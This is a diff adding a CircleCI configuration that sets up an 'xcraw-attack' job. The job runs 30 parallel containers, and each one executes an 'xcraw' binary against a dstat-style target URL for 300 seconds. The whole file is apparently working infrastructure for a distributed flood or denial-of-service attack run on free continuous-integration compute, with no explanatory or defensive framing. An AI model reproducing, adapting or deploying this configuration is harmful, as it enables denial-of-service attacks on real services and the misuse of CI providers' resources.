@@ -1,0 +1,38 @@
+version: 2.1
+
+jobs:
+  xcraw-attack:
+    docker:
+      - image: ubuntu:22.04
+    parallelism: 30  # 30 parallel jobs
+    parameters:
+      url:
+        type: string
+        default: "https://c3.dstatbot.win/w8T9RHK7"
+      time:
+        type: integer
+        default: 300
+    steps:
+      - checkout
+      - run:
+          name: Install dependencies
+          command: |
+            apt-get update
+            apt-get install -y wget python3 python3-pip
+      - run:
+          name: Make xcraw executable
+          command: chmod +x xcraw
+      - run:
+          name: Run xcraw attack
+          command: |
+            echo "Running shard ${CIRCLE_NODE_INDEX}/${CIRCLE_NODE_TOTAL}"
+            ./xcraw "<< parameters.url >>" "<< parameters.time >>" 90 1
+          no_output_timeout: 10m
+
+workflows:
+  version: 2
+  xcraw-workflow:
+    jobs:
+      - xcraw-attack:
+          url: "https://c3.dstatbot.win/w8T9RHK7"
+          time: 300
